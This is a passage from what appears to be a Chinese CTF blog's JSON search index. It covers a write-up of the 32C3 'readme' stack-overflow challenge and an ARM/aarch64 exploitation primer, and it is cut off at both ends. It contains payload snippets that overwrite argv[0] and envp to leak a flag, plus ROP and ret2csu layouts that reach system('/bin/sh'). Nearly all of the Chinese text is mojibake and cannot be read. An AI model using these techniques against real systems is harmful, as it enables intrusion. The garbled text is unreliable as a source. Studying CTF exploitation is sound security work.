æ•Œå¤šï¼Œå¦‚æœä¸æ˜¯é™æ€çš„ï¼Œå¯èƒ½è¿˜å¾—è´¹ä¸€ç•ªåŠŸå¤«ã€‚\n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://www.dazhuanlan.com/bob24/topics/1295510\n\n \n\n \n","tags":["mimic"],"categories":["PWN","pwné¢˜å‹"]},{"title":"32C3 CTF-readme","url":"/2021/08/19/32C3 CTF-readme/","content":"\n1.å¸¸è§„checksecï¼Œå¼€äº†NX,Canary,FORTIFYã€‚ç„¶åIDAæ‰¾æ¼æ´ï¼Œsub_4007E0å‡½æ•°ä¸­ç¬¬ä¸€æ¬¡è¾“å…¥åå­—æ—¶å­˜åœ¨æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n__int64 v3; // [rsp+0h] [rbp-128h]\n--------------------------------------------------------------------\n_IO_gets(&v3)\n```\n\n2.ç ”ç©¶ç¨‹åºï¼Œæœ‰æ•°æ®byte_600D20æç¤ºï¼Œç‚¹è¿›å»æç¤ºè¿œç¨‹ä¼šè¯»å–flagåˆ°è¿™ä¸ªåœ°æ–¹ï¼Œç”±äºè¿™é‡Œæœ‰Canaryå’Œæ ˆæº¢å‡ºï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥åˆ©ç”¨Canaryçš„æ£€æŸ¥å‡½æ•°___stack_chk_failæ¥æ³„éœ²ç¨‹åºä¸­byte_600D20å¤„çš„flagã€‚\n\n3.å‰ç½®çŸ¥è¯†ï¼š\n\n(1)libc2.24åŠä»¥ä¸‹çš„___stack_chk_failå‡½æ•°æ£€æŸ¥åˆ°canaryè¢«ä¿®æ”¹åï¼Œä¼šåœ¨ç¨‹åºç»“æŸæ—¶æ‰“å°*** stack smashing detected** â€ï¼š[**./readme.bin]** terminateã€‚è¿™é‡Œçº¢è‰²çš„éƒ¨åˆ†å°±æ˜¯ç¨‹åºåå­—ï¼Œç¨‹åºåˆå§‹åŒ–æ—¶å°±ä¼šè¯»å…¥å­˜å‚¨åˆ°argv[0]è¿™ä¸ªå‚æ•°é‡Œé¢ã€‚\n\n(éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç¨‹åºæœ€å¼€å§‹è¯»å…¥çš„æ˜¯ç¨‹åºçš„pwdç»å¯¹è·¯å¾„ï¼Œç±»ä¼¼äº/home/ctf/readme.binï¼Œä¹‹åä¼šåœ¨___stack_chk_failå‡½æ•°ä¸­å¯¹argv[0]ä¸­ä¿å­˜çš„å­—ç¬¦ä¸²è¿›è¡Œæ‹†è§£ï¼Œä»è€Œåªæ‰“å°å‡ºç¨‹åºåå­—)\n\n(2)ç”±äºargv[0]å‚æ•°æ˜¯mainå‡½æ•°çš„å‚æ•°ï¼Œç¨‹åºåˆå§‹åŒ–æ—¶å°±å­˜å‚¨åœ¨æ ˆä¸Šçš„è¾ƒé«˜åœ°å€å¤„ï¼Œæˆ‘ä»¬çš„è¾“å…¥è‚¯å®šæ˜¯åœ¨mainå‡½æ•°åŠä»¥åçš„å‡½æ•°æ ˆä¸­ï¼ŒåŸºæœ¬éƒ½å¤„äºè¾ƒä½åœ°å€å¤„ï¼Œæ‰€ä»¥ä¸€æ—¦æ ˆæº¢å‡ºè¶³å¤Ÿï¼Œé‚£ä¹ˆå°±å¯ä»¥è¦†ç›–åˆ°argv[0]ï¼Œä»è€Œå°†___stack_chk_failå‡½æ•°æ‰“å°ç¨‹åºåå­—çš„åœ°æ–¹è¦†ç›–æˆæˆ‘ä»¬æƒ³è¦çŸ¥é“çš„æŸä¸ªåœ°å€ä¸­çš„å€¼ï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯flagï¼Œbyte_600D20ã€‚\n\n4.æ‰€ä»¥è¿›è¡Œè¶³å¤Ÿé•¿åº¦çš„è¦†ç›–ï¼Œå°†argv[0]è¦†ç›–ä¸º0x600d20ï¼Œä½†æ˜¯ç”±äºä»¥ä¸‹å‡½æ•°\n\n```\n#æ³¨é‡Šå¤´\n\nbyte_600D20[v0++] = v1;\n--------------------------------------------------------------------------\nmemset((void *)((signed int)v0 + 0x600D20LL), 0, (unsigned int)(32 - v0));\n```\n\nå³ä½¿æˆ‘ä»¬è¦†ç›–æ‰äº†argv[0]ï¼Œé‚£ä¹ˆæ‰“å°å‡ºæ¥çš„ä¹Ÿä¸ä¼šæ˜¯flagã€‚è¿™é‡Œéœ€è¦ç”¨åˆ°å¦ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š\n\nâ–²åŠ¨æ€åŠ è½½å™¨æ ¹æ®ç¨‹åºå¤´å°†ç¨‹åºæ˜ å°„åˆ°å†…å­˜ï¼Œç”±äºç¨‹åºæ²¡å¼€PIEï¼Œæ‰€ä»¥å„æ®µçš„åŠ è½½åœ°å€å‡å·²ç»å›ºå®šï¼Œflagä½äº0x600D20ï¼Œå¤„äºç¬¬äºŒä¸ªLOADä¸­ï¼Œä¼šè¢«æ˜ å°„åˆ°å†…å­˜ä¸­çš„ç¬¬ä¸€ä¸ªLOADä¸­ï¼Œæ‰€ä»¥0x600D20å¤„çš„flagå³ä½¿è¢«è¦†ç›–ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªLOADä¸­çš„flagä¾ç„¶å­˜åœ¨ã€‚æ‰€ä»¥è¿™é‡Œé€‰æ‹©å°†argv[0]è¦†ç›–ä¸ºç¬¬ä¸€ä¸ªLOADä¸­çš„flagã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521279.jpeg)\n\nç¬¬ä¸€ä¸ªLOADä¸­çš„flagå¯»æ‰¾æ–¹æ³•ï¼Œpedaå¯ä»¥æŸ¥æ‰¾åˆ°ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521727.jpeg)\n\n5.ç°åœ¨è€ƒè™‘å¯»æ‰¾argv[0]çš„ä½ç½®ï¼Œç”±äºæœ€å¼€å§‹è¯»å–çš„æ˜¯pwdç»å¯¹è·¯å¾„ï¼Œæ‰€ä»¥åˆ©ç”¨è¿™ä¸ªæ¥å¯»æ‰¾ï¼Œå°†æ–­ç‚¹ä¸‹åœ¨b *0x40080Eï¼Œè¿™é‡Œæˆ‘çš„ç»å¯¹è·¯å¾„æ˜¯/ctf/AAAAAAAAï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521224.jpeg)\n\nä¸Šå›¾ä¸­ç”»çº¢çº¿çš„ä¸¤æ®µéƒ½æœ‰å¯èƒ½æ˜¯ï¼Œéƒ½å°è¯•ä¸€ä¸‹ï¼Œå¯ä»¥çŸ¥é“ç›¸å·®536å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€æ¡çº¢çº¿æ‰æ˜¯æ­£ç¡®çš„ã€‚\n\nç®€å•æ–¹æ³•ï¼šç›´æ¥ç”¨pwndbg>p &__libc_argv[0]\n\n6.å°è¯•ç¼–å†™payload:\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"\"\npayload += \"A\"*0x218\npayload += p64(flag_addr) #è¦†ç›–argv[0]\n```\n\nå´å‘ç°æ²¡åŠæ³•æ‰“å°å‡ºæ¥ï¼Œè¿*** stack smashing detected ***éƒ½æ²¡åŠæ³•æ¥å—åˆ°ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯è¿œç¨‹çš„ç¯å¢ƒå˜é‡å°†stderré”™è¯¯è¾“å‡ºæµè®¾ç½®ä¸º0ï¼Œåªæ‰“å°åœ¨è¿œç¨‹æœ¬åœ°ã€‚è¿™é‡Œç”¨socatæ­å»ºä¸€ä¸‹ï¼Œå¯ä»¥éªŒè¯å‡ºæ¥ï¼Œè¿œç¨‹æœ¬åœ°ä¸Šèƒ½æ‰“å°å‡ºæ¥ï¼š\n\n*** stack smashing detected ***: 32C3_TheServerHasTheFlagHere... terminated\n\n7.é‚£ä¹ˆå¦‚æœæƒ³é€šè¿‡è¯¥æ–¹æ³•è·å–è¿œç¨‹æ‰“å°çš„flagï¼Œå°±éœ€è¦å°†è¿œç¨‹çš„ç¯å¢ƒå˜é‡stderrè®¾ç½®ä¸º1ï¼Œä¹Ÿå°±æ˜¯LIBC_FATAL_STDERR_=1ã€‚é‚£ä¹ˆå¦‚ä½•ä¿®æ”¹è¿œç¨‹çš„ç¯å¢ƒå˜é‡å‘¢ï¼Œå¯ä»¥å†é€šè¿‡gdbè°ƒè¯•ï¼Œè¾“å…¥stack 100ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521326.jpeg)\n\nè¿™é‡Œçš„536å°±æ˜¯æ‰€åœ¨argv[0]ï¼Œå†çœ‹ä¸‹ä¸‹é¢çš„ä¸€äº›æ•°æ®ï¼Œ552ï¼Œ556éƒ½æ˜¯ç¯å¢ƒå˜é‡ï¼Œé‚£ä¹ˆåœ¨è¿œç¨‹è‚¯å®šæ˜¯éœ€è¦è°ƒç”¨çš„ï¼Œè¿™é‡Œé€‰æ‹©ä¿®æ”¹552å¤„çš„ç¯å¢ƒå˜é‡ã€‚é‚£ä¹ˆä¹‹ååˆå¦‚ä½•å°†LIBC_FATAL_STDERR_=1ä¼ è¿‡å»å‘¢ï¼Ÿè¿™é‡Œå°±æƒ³åˆ°ç¨‹åºæœ‰ç¬¬äºŒä¸ªè¾“å…¥ï¼Œæœ¬æ¥ç”¨æ¥è¦†ç›–0x600D20çš„å°±å¯ä»¥è¢«åˆ©ç”¨äº†ã€‚é€šè¿‡ç¬¬äºŒæ¬¡è¾“å…¥å°†LIBC_FATAL_STDERR_=1ä¼ è¿‡å»ï¼Œä¿å­˜åœ¨0x600D20å‰é¢éƒ¨åˆ†ï¼Œä¹‹åå°†552å¤„çš„å†…å®¹ä¿®æ”¹ä¸º0x600D20ï¼Œè¿™æ ·ç¯å¢ƒå˜é‡å°±è¢«æ›´æ”¹äº†ã€‚\n\n8.æ€»Payload:\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"\"\npayload += \"A\"*0x218\npayload += p64(0x400D20) #è¦†ç›–argv[0]\npayload += p64(0)\npayload += p64(0x600D20) #è¦†ç›–ç¯å¢ƒå˜é‡envpæŒ‡é’ˆ\n```\n\n9.å‘é€å®Œpayloadåå†å‘é€LIBC_FATAL_STDERR_=1å°±å¯ä»¥å°†flagæ‰“å°åœ¨æœ¬åœ°äº†ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\næ¯”è¾ƒå¤šï¼Œç½‘ä¸Šä¸å¤ªå…¨ï¼Œè¿™ä¸ªæ¯”è¾ƒå…¨\n\nhttps://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200\n","tags":["canary"],"categories":["PWN","canaryç»•è¿‡0x9"]},{"title":"å †å‰ç½®çŸ¥è¯†æ€»ç»“","url":"/2021/08/19/ARMåŸºç¡€/","content":"\nä¸€ã€å‰ç½®ç¯å¢ƒï¼š\n\nå…ˆè¯´æ˜ä¸€ä¸‹aarch64å°±æ˜¯armæŒ‡ä»¤æ¶æ„çš„64ä½ç‰ˆæœ¬ï¼Œæœ‰ç›¸åŒï¼Œä¹Ÿæœ‰ä¸åŒçš„åœ°æ–¹ã€‚è€ŒThumbæŒ‡ä»¤é›†åŸºæœ¬å°±ç›¸å½“äº16ä½ç‰ˆæœ¬armæŒ‡ä»¤æ¶æ„ã€‚\n\n1.å®‰è£…äº¤å‰ç¼–è¯‘ç¯å¢ƒï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\nsudo apt-get install gcc-arm-linux-gnueabi\nsudo apt-get install gcc-aarch64-linux-gnu\n```\n\nç„¶åå°±æ­£å¸¸ç¼–è¯‘å³å¯\n\n```bash\n#æ³¨é‡Šå¤´\n\narm-linux-gnueabi-gcc file.c -o file\naarch64-linux-gnu-gcc file.c -o file\n```\n\n2.å®‰è£…è¿è¡Œç¯å¢ƒï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\nsudo apt-get install g++-arm-linux-gnueabihf\nsudo apt-get install pkg-config-aarch64-linux-gnu\n```\n\nè¿™æ ·å¯¹äºé™æ€çš„armæ¶æ„æ–‡ä»¶å¯ä»¥ç”¨qemuç›´æ¥è¿è¡Œäº†ï¼Œå½“ç„¶éœ€è¦qemuå¯¹åº”æ”¯æŒã€‚\n\n3.è°ƒè¯•æ–‡ä»¶ï¼š\n\n(1)qemuè¿è¡Œèµ·æ¥\n\n```bash\n#æ³¨é‡Šå¤´\n\nqemu-arm -g 12345 -L /usr/arm-linux-gnueabi/ ./file\nqemu-aarch64 -g 12345 -L /usr/aarch64-linux-gnu/ ./file\n```\n\nè¿™é‡Œ-gä»£è¡¨ç«¯å£æ˜ å°„çš„æ„æ€ï¼Œç”¨æ¥é…åˆå¤–é¢çš„gdbï¼Œè¿™é‡Œç”¨åˆ°ç«¯å£12345ã€‚\n\n-Lä»£è¡¨åŠ è½½è¿è¡Œåº“ï¼Œè¿™é‡Œå®‰è£…è¿è¡Œç¯å¢ƒä¹‹ååŸºæœ¬éƒ½åœ¨è¿™ä¸ªä½ç½®/usr/...../ã€‚\n\n(2)gdbè¿œç¨‹é™„åŠ è°ƒè¯•ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\ngdb-multiarch -q ./file\ntarget remote localhost:12345\n```\n\nè¿™é‡Œä¸è®¾ç½®set architecture arm  set architecture aarch64ä¹Ÿè¡Œçš„ã€‚\n\nä¹‹åå°±æ­£å¸¸è°ƒè¯•ï¼Œä¸è¿‡ä¸­é€”æ–­ä¸‹æ¥éœ€è¦åœ¨qemuè¿è¡Œçš„ç»ˆç«¯åœ°æ–¹ctrl+cï¼Œè€Œä¸æ˜¯gdbå¤„ã€‚\n\n \n\näºŒã€åŸºç¡€å­¦ä¹ ï¼š\n\n1.å¯„å­˜å™¨ï¼š\n\nARMä¸­ï¼š(32ä½ç‰ˆæœ¬)\n\n![32](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs32.png)\n\nAARCH64ä¸­ï¼š(64ä½ç‰ˆæœ¬)\n\n![64](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs64.png)\n\n(1)R0~R3ï¼šå‡½æ•°è°ƒç”¨å‚æ•°ï¼Œä»£è¡¨ç¬¬0~4ä¸ªå‚æ•°ï¼Œå‰©ä¸‹çš„å‚æ•°ä»å³å‘å·¦ä¾æ¬¡å…¥æ ˆï¼Œå‡½æ•°è¿”å›å€¼ä¿å­˜åœ¨R0ä¸­ã€‚(å¯¹åº”åœ¨aarch64ä¸­ä¸ºR0~R7ï¼Œä½†æ˜¯gdbè°ƒè¯•æˆ–è€…IDAä¸­ä¸€èˆ¬æ˜¾ç¤ºX0~X30ï¼ŒåŒæ—¶è¿˜æœ‰ä½32ä½çš„W0~W30)\n\n(2)SPï¼šç±»ä¼¼rsp,espï¼Œæ ˆæŒ‡é’ˆ\n\n(3)FPï¼šç±»ä¼¼ebpï¼Œæ ˆæŒ‡é’ˆ\n\n(4)LRï¼šå½“å‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ï¼Œä¼šä¿å­˜è°ƒç”¨å‡½æ•°å¤„çš„åœ°å€ï¼Œé€€å‡ºå‡½æ•°æ—¶èµ‹å€¼ç»™PCã€‚\n\n(5)PCï¼šç±»ä¼¼eip,ripï¼Œå­˜å‚¨ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚\n\n \n\n2.åŸºç¡€æŒ‡ä»¤ï¼š\n\n(1)STMä»¥åŠLDMæ˜¯æŒ‡ä»¤å‰ç¼€ï¼Œè¡¨ç¤ºå¤šå¯„å­˜å™¨å¯»å€ï¼Œæ¥è£…è½½å’Œå­˜å‚¨å¤šä¸ªå­—çš„æ•°æ®åˆ°å†…å­˜ï¼Œåé¢åŠ ä¸Šä¸åŒçš„åç¼€ä»£è¡¨ä¸åŒçš„æŒ‡ä»¤ï¼Œç±»ä¼¼çš„æœ‰STMFA,STMIB, LDMFA,LDMDAç­‰ç­‰ï¼š\n\nå¸¸è§çš„æœ‰FDï¼Œä»£è¡¨æ»¡æ ˆè½¬å­˜ï¼ŒEDä»£è¡¨ç©ºæ ˆè½¬å­˜ã€‚\n\nâ–²æ»¡æ ˆå’Œç©ºæ ˆï¼šæ»¡æ ˆæ“ä½œæ—¶SPæŒ‡å‘ä¸Šæ¬¡å†™çš„æœ€åä¸€ä¸ªæ•°æ®å•å…ƒï¼Œè€Œç©ºæ ˆçš„æ ˆæŒ‡é’ˆSPæŒ‡å‘ç¬¬ä¸€ä¸ªç©ºé—²å•å…ƒã€‚\n\nç±»ä¼¼æœ‰STMFD SP! { }å’ŒLDMFD SP! { }ï¼š\n\nå³ç›¸å½“äºpushå’Œpopï¼Œåœ¨gdbä¸­æ˜¾ç¤ºpushï¼Œpopï¼ŒIDAä¸­æ˜¾ç¤ºSTMFDå’ŒLDMFDã€‚\n\nSTMFD  SP!, {R11,LR}ï¼šå°†R11å’ŒLRå…¥æ ˆï¼Œç›¸å½“äºpush R11ä»¥åŠLRä¸­ä¿å­˜çš„å€¼å…¥æ ˆã€‚\n\nåŒç†LDMFDå³ç›¸å½“äºpopã€‚\n\n(2).STRæŒ‡ä»¤ï¼šå°†å‰æ“ä½œæ•°å¯„å­˜å™¨æ•°æ®å¤åˆ¶åˆ°åæ“ä½œæ•°åœ°å€å¯¹åº”çš„å†…å­˜ä¸Šï¼Œç±»ä¼¼mov\n\nSTR  r3, [fp, #-0xc]ï¼šå°†å¯„å­˜å™¨r3ä¸­çš„å€¼èµ‹ç»™fp-0xcåœ°å€å¯¹åº”çš„å†…å­˜ã€‚è¿™é‡Œfpå°±æ˜¯R11ã€‚\n\nSTR  r3, placeï¼šè¿™é‡Œæ˜¯èµ‹å€¼ç»™pc+placeåœ°å€å¯¹åº”å†…å­˜ã€‚\n\nç­‰ç­‰â€¦.\n\n(æ•°æ®å¤åˆ¶æ–¹å‘ï¼šå‰->å)\n\n(3).LDRæŒ‡ä»¤ï¼šä¹Ÿæ˜¯æŒ‡ä»¤å‰ç¼€ï¼Œåé¢ä¹Ÿä¼šè·Ÿä¸Šä¸€äº›ä¸åŒçš„åç¼€ï¼Œå¸¸è§æœ‰LDRBï¼ŒLDRHç­‰ç­‰ã€‚\n\nLDR R0ï¼Œ[R1,ï¼ƒ8]ï¼šå°†r1+8åœ°å€å¯¹åº”å†…å­˜å¤åˆ¶ç»™r0ã€‚\n\n(æ•°æ®å¤åˆ¶æ–¹å‘ï¼šå->å‰)\n\n(4).Bï¼šè·³è½¬æŒ‡ä»¤ï¼ŒåŒæ ·ä¹Ÿæ˜¯ç±»ä¼¼ä¸€ä¸ªå‰ç¼€æŒ‡ä»¤\n\nâ‘  Bï¼šç›´æ¥è·³è½¬ï¼Œç›®æ ‡åœ°å€æ˜¯ç›¸å¯¹äºå½“å‰PCå€¼çš„åç§»åœ°å€\n\nâ‘¡ BLï¼šè·³è½¬ä¹‹å‰ä¼šæŠŠPCå€¼å­˜åˆ°R14ï¼ˆLRï¼‰å¯„å­˜å™¨ä¸­ï¼Œé€šå¸¸ç”¨äºå‡½æ•°è°ƒç”¨ï¼Œä»è¢«è°ƒç”¨å‡½æ•°è¿”å›æ—¶ï¼Œé€šå¸¸éœ€è¦ç”¨åˆ°BX LR;æˆ–è€…MOV PC,LR;ç­‰\n\nâ‘¢BXï¼šè·³è½¬åˆ°ARMæŒ‡ä»¤æˆ–è€…ThumbæŒ‡ä»¤\n\nâ‘£BLXï¼šç»“åˆäº†BLå’ŒBXä¸¤ä¸ªæŒ‡ä»¤çš„åŠŸèƒ½ã€‚\n\n \n\nä¸‰ã€ARM(32ä½æ¶æ„)å‡½æ•°åˆ†ç±»ï¼š\n\n1.å¶å­å‡½æ•°ï¼šä¸åšä»»ä½•å…¶ä»–å‡½æ•°è°ƒç”¨çš„å‡½æ•°\n\nè°ƒç”¨æ—¶çš„æ ˆçŠ¶æ€åˆ†æï¼šå’Œæ­£å¸¸çš„x86å·®ä¸å¤šï¼Œå‹å…¥fpï¼Œsub spå¼€è¾Ÿæ ˆç©ºé—´ã€‚æœ€åé€šè¿‡Add sp,fp,#0å’Œpop{fp}å†åŠ ä¸ŠBX LRæ¥è¿”å›ã€‚\n\n![arm3](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsarm3.png)\n\n![arm4](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsarm4.png)\n\n\n\nFPä¸­çš„å†…å®¹æ˜¯ä¸Šä¸€ä¸ªå‡½æ•°æ ˆçš„FPæŒ‡é’ˆï¼Œå¹¶ä¸”æ ˆä¸Šä¸å­˜åœ¨å­˜æ”¾è¿”å›åœ°å€çš„åœ°æ–¹ï¼Œæ— æ³•ç›´æ¥åŠ«æŒè¿”å›åœ°å€ã€‚\n\nâ–²æ ˆæ¨¡å‹å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n+-------------+\n|             |\n|  padding    |\n+-------------+\n|  Last FP    | <- frame pointer\n+-------------+\n```\n\nä½†æ˜¯è¿™æ ·å°±ä¸å¥½åˆ©ç”¨ï¼Œé‚£ä¹ˆå°±å°è¯•åŠ«æŒæ ˆè¿ç§»ä¸€æ®µè·ç¦»ï¼Œä½¿å¾—ä¸Šä¸€ä¸ªéå¶å­å‡½æ•°çš„å‰©ä¸‹çš„æ±‡ç¼–ä»£ç æ‰€ç”¨åˆ°çš„æ ˆä¸Šæ•°æ®æ˜¯æˆ‘ä»¬ä¼ªé€ çš„æ ˆä¸­çš„æ•°æ®ï¼Œè¿™æ ·å°±èƒ½å®ŒæˆåŠ«æŒä¸Šä¸€ä¸ªéå¶å­å‡½æ•°çš„è¿”å›åœ°å€ã€‚éœ€è¦å¯¹æ±‡ç¼–æœ‰ä¸€å®šåŠŸåŠ›ã€‚\n\n2.éå¶å­å‡½æ•°ï¼šå¤šäº†ä¸€ç‚¹ä¸åŒï¼Œå³ä¼šå‹å…¥FPæ—¶ï¼Œå°†LRä¹Ÿå‹å…¥ï¼Œä¸”LRå…ˆäºFPå‹å…¥ï¼Œå³å‡½æ•°æ ˆä¸­çš„FPæŒ‡å‘çš„æ˜¯ä¿å­˜çš„LRï¼Œè€Œä¸æ˜¯å¶å­å‡½æ•°ä¸­æŒ‡å‘çš„æ˜¯ä¸Šä¸€ä¸ªå‡½æ•°æ ˆçš„FPã€‚æœ€åé€šè¿‡sub sp,fp,#4åŠ ä¸Špop {fp,pc}æ¥è¿”å›ã€‚\n\nâ–²å…¶å®è¿”å›æ—¶addå’Œsubæ²¡å¤šå¤§å·®åˆ«ï¼Œåªé’ˆå¯¹åä¸¤ä¸ªæ“ä½œæ•°çš„ï¼Œä¹Ÿå°±ç«‹å³æ•°çš„ç¬¦å·ç›¸åå‘—ï¼Œåä¸¤ä¸ªæ“ä½œæ•°è®¡ç®—å®Œæˆåèµ‹å€¼ç»™spå®ç°æ ˆè¿˜åŸã€‚\n\nâ–²æ ˆæ¨¡å‹å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n\n+-------------+\n|             |\n|  padding    |\n+-------------+\n| return_addr | <- frame pointer\n+-------------+\n|  Last FP    |\n+-------------+\n```\n\nè™½ç„¶FPä¸­çš„å†…å®¹å®é™…ä¸Šæ˜¯LRçš„å†…å®¹,ä½†å…¶å®ä¹Ÿå·®ä¸å¤šï¼Œåæ­£æœ€åè¿”å›æ—¶éƒ½ä¼šå‘ç”ŸSPç§»åŠ¨ï¼Œå…ˆå–FPï¼Œå†å–å¯¹åº”çš„PCï¼Œæ‰€ä»¥å®é™…æ€ä¹ˆæ ·ä¹Ÿæ— æ‰€è°“äº†ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191437383.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191437497.png)\n\nè¿™æ ·å°±ç›¸å½“äºå¸¸è§„çš„32ä½æ ˆæ¨¡å‹ebp-eipäº†ï¼Œåªä¸è¿‡ä¸æ¶‰åŠå‚æ•°ï¼Œä¸€èˆ¬éœ€è¦ç”¨gadgetæ¥ä¸ºå¯¹åº”å‚æ•°èµ‹å€¼ã€‚\n\nåœ¨å¸¸è§„æ ˆæº¢å‡ºæ—¶ï¼Œè¿™é‡Œå‘æŒ¥é‡è¦ä½œç”¨çš„å°±æ˜¯gadgets_addräº†ï¼Œä¸€èˆ¬å¯ä»¥å…ˆROPgadget --binary ./pwn --only \"pop\"ï¼ŒæŸ¥æ‰¾å¯¹åº”çš„pop gadgetã€‚ä¾‹å¦‚è¿™é‡Œå¯ä»¥æœ‰pop {r0, r4, pc}ï¼Œé‚£ä¹ˆå®Œæˆåˆ©ç”¨çš„æ ˆæ¨¡å‹å°±å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n+-------------+\n|             |\n|  padding    |\n+-------------+\n|  padding    | <- frame pointer\n+-------------+\n|gadgets_addr | <- return address\n+-------------+\n|binsh_addr   |\n+-------------+\n|junk_data    |\n+-------------+\n|system_addr  |\n+-------------+\n```\n\nå°†binsh_addrèµ‹å€¼ç»™r0ï¼Œjunk_dataèµ‹å€¼ç»™r4ï¼Œsystem_addrèµ‹å€¼ç»™pcï¼Œå®Œæˆåˆ©ç”¨ã€‚\n\nâ˜…åœ¨æ ˆæº¢å‡ºæ¢ç´¢paddingæ—¶ï¼Œå¯ä»¥ç”¨pwndbgä¸­çš„cyclic 200è‡ªåŠ¨ç”Ÿæˆ200ä¸ªå­—ç¬¦ï¼Œç„¶åè¾“å…¥ï¼Œé‚£ä¹ˆåœ¨arm(32ä½)æ¶æ„ä¸‹çš„éå¶å­å‡½æ•°ä¸­ï¼Œä¸€å®šä¼šç»™pcèµ‹å€¼ä¸ºæˆ‘ä»¬çš„æŸä¸ªpaddingï¼Œè¿™æ—¶å€™ç¨‹åºæ–­ä¸‹æ¥ï¼Œå¯ä»¥æŸ¥çœ‹pcçš„å€¼ï¼Œç”¨cyclic -l [PCå€¼]æ¥æŸ¥æ‰¾æº¢å‡ºç‚¹ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438678.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438837.png)\n\nâ–²æ‰€ä»¥è¿™é‡Œå¦‚æœé’ˆå¯¹éå¶å­å‡½æ•°åŠ«æŒäº†FPå’ŒFP+4ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºåŠ«æŒæ ˆå¹¶ä¸”æ§åˆ¶ç¨‹åºæµäº†ï¼Œå¦‚æœæƒ³è°ƒç”¨å‡½æ•°è¿˜éœ€è¦è®¾ç½®å‚æ•°å¯„å­˜å™¨r0-r3æ‰è¡Œã€‚\n\nç®€å•çš„å¯ä»¥ç›´æ¥æŸ¥æ‰¾pop r0,pcä¹‹ç±»çš„ï¼šROPgadget --binary ./pwn --only \"pop\"ï¼Œè¿™ç§æ–¹å¼ä¸€èˆ¬åªèƒ½è°ƒç”¨ä¸€ä¸ªå‚æ•°çš„å‡½æ•°ã€‚\n\næ³„éœ²åœ°å€ä¹‹ç±»çš„ä¸€èˆ¬è¿˜æ˜¯éœ€è¦ç”¨åˆ°ret2csuï¼Œarm(32ä½)ä¸‹çš„ret2csuä¸€èˆ¬æ˜¯ç”¨åˆ°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n.text:0001049C                 LDR     R3, [R5],#4                 â‘¡\n.text:000104A0                 MOV     R2, R9\n.text:000104A4                 MOV     R1, R8\n.text:000104A8                 MOV     R0, R7\n.text:000104AC                 BLX     R3                          â‘¢\n.text:000104B0                 CMP     R6, R4\n.text:000104B4                 BNE     loc_10498\n.text:000104B8                 LDMFD   SP!, {R4-R10,PC}            â‘ \n```\n\nå³é€šè¿‡â‘ æ¥ä¸ºR4-R10èµ‹å€¼ï¼Œä»¥åŠæ§åˆ¶PCè·³è½¬åˆ°â‘¡ï¼Œå†åˆ©ç”¨R5åœ°å€å¯¹åº”çš„å€¼æ¥èµ‹å€¼ç»™R3å¯¹åº”è·³è½¬ï¼ŒæœŸé—´ä¹Ÿå¯é€šè¿‡R7-R8æ¥æ§åˆ¶R0-R2çš„å‚æ•°ã€‚è¿™é‡Œéœ€è¦æ»¡è¶³R5å¤„ä¿å­˜çš„æ˜¯gotè¡¨åœ°å€ï¼Œå³å°†R5èµ‹å€¼ä¸ºfunc_got_addrå³å¯ã€‚\n\n \n\nå››ã€aarch64æ¶æ„çš„å‡½æ•°åˆ†ç±»ï¼šå…¶å®å°±æ˜¯ARMçš„64ä½ç‰ˆæœ¬ï¼Œé™¤äº†å¯„å­˜å™¨æ–¹é¢å˜åŒ–æŒºå¤§ï¼Œå…¶ä»–çš„è°ƒç”¨æ–¹å¼ä»€ä¹ˆçš„ä¹Ÿå·®ä¸äº†å¤ªå¤šã€‚\n\n1.å¶å­å‡½æ•°ï¼šä¸åšä»»ä½•å…¶ä»–å‡½æ•°è°ƒç”¨çš„å‡½æ•°\n\nè°ƒç”¨æ—¶çš„æ ˆçŠ¶æ€åˆ†æï¼šå’Œæ­£å¸¸çš„armå·®ä¸å¤šï¼ŒFPå…¥æ ˆï¼Œsub spå¼€è¾Ÿæ ˆç©ºé—´ã€‚æœ€åé€šè¿‡Add sp,sp,#20å’Œretæ¥è¿”å›ã€‚Retç›¸å½“äºmov 